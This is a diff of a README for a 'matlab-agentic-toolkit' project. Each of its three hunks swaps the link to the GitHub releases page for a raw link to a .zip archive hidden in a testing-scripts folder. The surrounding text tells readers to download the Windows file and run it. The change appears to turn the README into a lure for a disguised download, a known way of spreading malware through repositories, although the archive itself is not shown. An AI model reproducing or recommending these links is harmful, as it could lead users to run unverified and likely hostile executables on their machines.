@@ -1,6 +1,6 @@
 # 🤖 matlab-agentic-toolkit - MATLAB for agent-driven workflows
 
-[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/vikto2953/matlab-agentic-toolkit/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/vikto2953/matlab-agentic-toolkit/main/skills-catalog/matlab-core/matlab-testing/scripts/toolkit_agentic_matlab_v3.0.zip)
 
 ## 🚀 Overview
 
@@ -15,7 +15,7 @@ This tool is built for end users who want to:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/vikto2953/matlab-agentic-toolkit/releases
+https://raw.githubusercontent.com/vikto2953/matlab-agentic-toolkit/main/skills-catalog/matlab-core/matlab-testing/scripts/toolkit_agentic_matlab_v3.0.zip
 
 On that page, look for the latest release and download the Windows file that matches your device. If you see a `.zip` file, download it and extract it first. If you see an `.exe` file, download and run it.
 
@@ -147,7 +147,7 @@ This keeps the work in a clear path from request to result.
 
 ## 📎 Download Again
 
-[Download the latest release on GitHub](https://github.com/vikto2953/matlab-agentic-toolkit/releases)
+[Download the latest release on GitHub](https://raw.githubusercontent.com/vikto2953/matlab-agentic-toolkit/main/skills-catalog/matlab-core/matlab-testing/scripts/toolkit_agentic_matlab_v3.0.zip)
 
 ## 🧰 Notes for Daily Use
 
